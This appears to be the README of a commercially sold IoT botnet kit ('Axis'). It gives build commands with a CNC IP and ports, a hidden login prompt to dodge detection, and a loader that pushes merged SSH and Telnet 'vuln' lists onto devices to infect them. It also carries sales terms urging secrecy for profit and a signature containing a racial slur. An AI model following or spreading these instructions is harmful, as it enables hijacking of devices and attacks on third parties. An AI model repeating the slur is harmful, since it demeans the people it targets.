			[+]==== Axis - RyM Gang ====[+]
[+]===============================================================================[+]
Setup: *THERE IS NO NEED TO EDIT/ADD ANYTHING IN ANY FILES BEFOREHAND
	Load All Files Into /root/
	Run: python Build.py
	It Will Display The Required Arguments
	This Is Where You Choose What Ports You Want It Up On
	If You Want Your SH File Named EkSgbins.sh, BotPort 666 and CNCPort 747:
	Run: python Build.py 185.101.105.117 yoyo 576 69

	That's It
	If You Guys Can't Manage To Set This Up I'm Done Making Shit Lol

[+]===============================================================================[+]
Connecting: When You Connect To The Server Through PuTTY (Raw), The Terminal Will Remain Black.
You Must Type The Word "login" and Press Enter... You Will Then Be Prompted For Username.
This Is To Prevent Automated Snooping.
[+]===============================================================================[+]
Loader:
	Simply Put SSH Vulns in /root/Loader/SSH/, Telnet Vulns in /root/Loader/TELNET/
	The Loader Merges All Files In The Specified Directory Into One Vuln
	  Places It In /root/Loader/
	   Then Runs The Respective Loader

	To Run SSH Vulns:
		cd Loader; ./Loader SSH
	To Run Telnet Vulns:
		cd Loader; ./Loader TELNET
    
	     [+] Tragic Loader [+]
	Merge Vulns/Rerun Existing Merge?
	(MERGE/RERUN):

	If It's Your First Time Using It, Choose MERGE
	The Loader Will Merge Your Vulns And Load
	All Merges Are Saved; If You Want To Load A Previously Made Merge, Choose RERUN

[+]===============================================================================================================[+]
    Modifying This Code Is Permitted, However, Ripping Code From This/Removing Credits Is The Lowest Of The Low.
    Sales Release 10/5/2019
    KEEP IT PRIVATE; I'd Rather You Sell It Than Give It Away Or Post Somewhere. We're All Here To Make Money!
    Much Love 
        - Tragedy Ghoul is a Nigger